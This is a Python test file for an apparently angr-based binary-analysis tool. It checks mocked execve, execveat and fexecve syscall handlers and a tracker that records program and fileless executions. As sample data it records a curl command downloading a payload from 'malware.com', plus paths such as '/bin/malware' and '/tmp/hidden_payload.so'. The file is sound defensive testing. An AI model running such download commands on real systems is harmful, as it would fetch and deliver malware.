"""Tests for exec*() syscall SimProcedures."""

import pytest
from unittest.mock import MagicMock, PropertyMock


class TestDynExecve:
    """Test cases for DynExecve SimProcedure."""

    @pytest.fixture(autouse=True)
    def setup(self):
        """Setup test fixtures."""
        from dynpathresolver.simprocedures.syscalls.exec import DynExecve
        DynExecve.reset()
        yield
        DynExecve.reset()

    def test_basic_execve(self):
        """Test basic execve operation."""
        from dynpathresolver.simprocedures.syscalls.exec import DynExecve

        # Create mock state
        state = MagicMock()
        state.globals = {}
        state.solver.symbolic = MagicMock(return_value=False)
        state.solver.eval = MagicMock(return_value=0x1000)
        state.solver.satisfiable = MagicMock(return_value=True)
        state.arch.bits = 64
        state.arch.bytes = 8

        # Mock memory read for pathname
        state.mem.__getitem__ = MagicMock()
        state.mem.__getitem__.return_value.string.concrete = b"/bin/ls"

        proc = DynExecve()
        proc.state = state

        result = proc.run(0x1000, 0, 0)

        # Should return -1 (we don't actually exec)
        assert result is not None

    def test_execve_with_tracker(self):
        """Test execve with ProcessExecutionTracker."""
        from dynpathresolver.simprocedures.syscalls.exec import DynExecve
        from dynpathresolver.tracking.process_tracker import ProcessExecutionTracker

        # Create tracker
        project = MagicMock()
        tracker = ProcessExecutionTracker(project)

        DynExecve.process_tracker = tracker

        # Create mock state
        state = MagicMock()
        state.globals = {}
        state.solver.symbolic = MagicMock(return_value=False)
        state.solver.eval = MagicMock(return_value=0x1000)
        state.solver.satisfiable = MagicMock(return_value=True)
        state.arch.bits = 64
        state.arch.bytes = 8
        state.addr = 0x400000
        state.history.depth = 5

        # Mock memory read
        state.mem.__getitem__ = MagicMock()
        state.mem.__getitem__.return_value.string.concrete = b"/bin/malware"

        proc = DynExecve()
        proc.state = state

        result = proc.run(0x1000, 0, 0)

        # Check tracker recorded the execution
        assert tracker.total_execs == 1
        programs = tracker.get_executed_programs()
        assert len(programs) == 1
        assert programs[0].path == "/bin/malware"
        assert programs[0].exec_type == "execve"


class TestDynExecveat:
    """Test cases for DynExecveat SimProcedure."""

    @pytest.fixture(autouse=True)
    def setup(self):
        """Setup test fixtures."""
        from dynpathresolver.simprocedures.syscalls.exec import DynExecveat
        DynExecveat.reset()
        yield
        DynExecveat.reset()

    def test_execveat_basic(self):
        """Test basic execveat operation."""
        from dynpathresolver.simprocedures.syscalls.exec import DynExecveat, AT_FDCWD

        state = MagicMock()
        state.globals = {}
        state.solver.symbolic = MagicMock(return_value=False)
        state.solver.eval = MagicMock(side_effect=lambda x: x if isinstance(x, int) else 0x1000)
        state.solver.satisfiable = MagicMock(return_value=True)
        state.arch.bits = 64
        state.arch.bytes = 8

        # Mock memory read
        state.mem.__getitem__ = MagicMock()
        state.mem.__getitem__.return_value.string.concrete = b"./payload"

        proc = DynExecveat()
        proc.state = state

        result = proc.run(AT_FDCWD, 0x1000, 0, 0, 0)

        assert result is not None

    def test_execveat_empty_path(self):
        """Test execveat with AT_EMPTY_PATH (execute from fd)."""
        from dynpathresolver.simprocedures.syscalls.exec import DynExecveat, AT_EMPTY_PATH
        from dynpathresolver.tracking.process_tracker import ProcessExecutionTracker

        # Create tracker
        project = MagicMock()
        tracker = ProcessExecutionTracker(project)
        DynExecveat.process_tracker = tracker

        state = MagicMock()
        state.globals = {}
        state.solver.symbolic = MagicMock(return_value=False)
        state.solver.eval = MagicMock(side_effect=lambda x: x if isinstance(x, int) else 0)
        state.solver.satisfiable = MagicMock(return_value=True)
        state.arch.bits = 64
        state.arch.bytes = 8
        state.addr = 0x400000
        state.history.depth = 3

        # Mock empty path string
        state.mem.__getitem__ = MagicMock()
        state.mem.__getitem__.return_value.string.concrete = b""

        proc = DynExecveat()
        proc.state = state

        # Execute from fd 5 with AT_EMPTY_PATH
        result = proc.run(5, 0, 0, 0, AT_EMPTY_PATH)

        # Check tracker recorded with /proc/self/fd/5
        assert tracker.total_execs == 1
        programs = tracker.get_executed_programs()
        assert len(programs) == 1
        assert "/proc/self/fd/5" in programs[0].path
        assert programs[0].exec_type == "execveat"


class TestDynFexecve:
    """Test cases for DynFexecve SimProcedure."""

    @pytest.fixture(autouse=True)
    def setup(self):
        """Setup test fixtures."""
        from dynpathresolver.simprocedures.syscalls.exec import DynFexecve
        DynFexecve.reset()
        yield
        DynFexecve.reset()

    def test_fexecve_basic(self):
        """Test basic fexecve operation (fileless execution)."""
        from dynpathresolver.simprocedures.syscalls.exec import DynFexecve
        from dynpathresolver.tracking.process_tracker import ProcessExecutionTracker

        # Create tracker
        project = MagicMock()
        tracker = ProcessExecutionTracker(project)
        DynFexecve.process_tracker = tracker

        state = MagicMock()
        state.globals = {}
        state.solver.symbolic = MagicMock(return_value=False)
        state.solver.eval = MagicMock(side_effect=lambda x: x if isinstance(x, int) else 0)
        state.solver.satisfiable = MagicMock(return_value=True)
        state.arch.bits = 64
        state.arch.bytes = 8
        state.addr = 0x400000
        state.history.depth = 10

        proc = DynFexecve()
        proc.state = state

        # Execute from fd 42
        result = proc.run(42, 0, 0)

        # Check tracker recorded fileless execution
        assert tracker.total_execs == 1
        fileless = tracker.get_fexecve_programs()
        assert len(fileless) == 1
        assert fileless[0].fd == 42
        assert fileless[0].exec_type == "fexecve"

    def test_fexecve_with_memory_tracker(self):
        """Test fexecve with memory tracker to resolve filepath."""
        from dynpathresolver.simprocedures.syscalls.exec import DynFexecve
        from dynpathresolver.tracking.process_tracker import ProcessExecutionTracker
        from dynpathresolver.tracking.memory_tracker import MemoryRegionTracker

        # Create trackers
        project = MagicMock()
        process_tracker = ProcessExecutionTracker(project)
        memory_tracker = MemoryRegionTracker(project)

        # Register a file with memory tracker
        state = MagicMock()
        state.addr = 0x400000
        state.history.depth = 1
        memory_tracker.record_open(state, "/tmp/hidden_payload.so", 0, 42)

        DynFexecve.process_tracker = process_tracker
        DynFexecve.memory_tracker = memory_tracker

        exec_state = MagicMock()
        exec_state.globals = {}
        exec_state.solver.symbolic = MagicMock(return_value=False)
        exec_state.solver.eval = MagicMock(side_effect=lambda x: x if isinstance(x, int) else 0)
        exec_state.solver.satisfiable = MagicMock(return_value=True)
        exec_state.arch.bits = 64
        exec_state.arch.bytes = 8
        exec_state.addr = 0x400100
        exec_state.history.depth = 5

        proc = DynFexecve()
        proc.state = exec_state

        # Execute from fd 42
        result = proc.run(42, 0, 0)

        # Check filepath was resolved
        programs = process_tracker.get_executed_programs()
        assert len(programs) == 1
        assert programs[0].path == "/tmp/hidden_payload.so"


class TestProcessExecutionTracker:
    """Test ProcessExecutionTracker class."""

    def test_tracker_initialization(self):
        """Test tracker initializes correctly."""
        from dynpathresolver.tracking.process_tracker import ProcessExecutionTracker

        project = MagicMock()
        tracker = ProcessExecutionTracker(project)

        assert tracker.total_execs == 0
        assert tracker.total_clones == 0
        assert len(tracker.executed_programs) == 0
        assert len(tracker.cloned_processes) == 0

    def test_record_execve(self):
        """Test recording execve."""
        from dynpathresolver.tracking.process_tracker import ProcessExecutionTracker

        project = MagicMock()
        tracker = ProcessExecutionTracker(project)

        state = MagicMock()
        state.addr = 0x400000
        state.history.depth = 5

        program = tracker.record_execve(
            state,
            path="/usr/bin/curl",
            argv=["curl", "http://malware.com/payload"],
            envp=["PATH=/usr/bin"],
        )

        assert tracker.total_execs == 1
        assert program.path == "/usr/bin/curl"
        assert len(program.argv) == 2
        assert program.exec_type == "execve"

    def test_get_statistics(self):
        """Test getting statistics."""
        from dynpathresolver.tracking.process_tracker import ProcessExecutionTracker

        project = MagicMock()
        tracker = ProcessExecutionTracker(project)

        state = MagicMock()
        state.addr = 0x400000
        state.history.depth = 1

        tracker.record_execve(state, "/bin/sh")
        tracker.record_fexecve(state, 10)
        tracker.record_clone(state, 0x100)  # CLONE_VM

        stats = tracker.get_statistics()

        assert stats['total_execs'] == 2
        assert stats['total_clones'] == 1
        assert stats['execve_count'] == 1
        assert stats['fexecve_count'] == 1
        assert stats['clone_vm_count'] == 1

    def test_reset(self):
        """Test tracker reset."""
        from dynpathresolver.tracking.process_tracker import ProcessExecutionTracker

        project = MagicMock()
        tracker = ProcessExecutionTracker(project)

        state = MagicMock()
        state.addr = 0x400000
        state.history.depth = 1

        tracker.record_execve(state, "/bin/sh")
        tracker.record_clone(state, 0)

        tracker.reset()

        assert tracker.total_execs == 0
        assert tracker.total_clones == 0
        assert len(tracker.executed_programs) == 0
